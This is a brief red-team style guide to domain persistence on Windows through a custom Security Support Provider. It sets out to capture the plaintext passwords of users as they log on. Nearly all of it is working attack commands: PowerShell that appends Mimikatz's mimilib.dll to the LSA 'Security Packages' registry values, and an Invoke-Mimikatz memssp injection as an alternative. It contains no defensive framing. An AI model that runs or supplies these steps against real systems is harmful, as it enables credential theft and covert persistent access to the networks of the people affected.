### **DOMAIN PERSISTENCE VIA CUSTOM SSP**

Custom Security Support Providers (SSPs) can be used to capture plaintext passwords from users that log on. This guide provides steps to set up a custom SSP using a DLL, such as `mimilib.dll` from Mimikatz.

### **STEPS TO SET UP A CUSTOM SSP**

1.  Get Current Security Packages:    
    `$packages = Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig" -Name 'Security Packages' | select -ExpandProperty 'Security Packages'`
    
2.  Append the Custom DLL (e.g., mimilib): `$packages += "mimilib"`
    
3.  Update the OSConfig registry key with the new packages    
    `Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig" -Name 'Security Packages' -Value $packages`
    
4.  Update the Lsa registry key with the new packages    
    `Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name 'Security Packages' -Value $packages`
    
5.  Alternative Method Using Mimikatz to inject mimilib    
    `Invoke-Mimikatz -Command '"misc::memssp"'`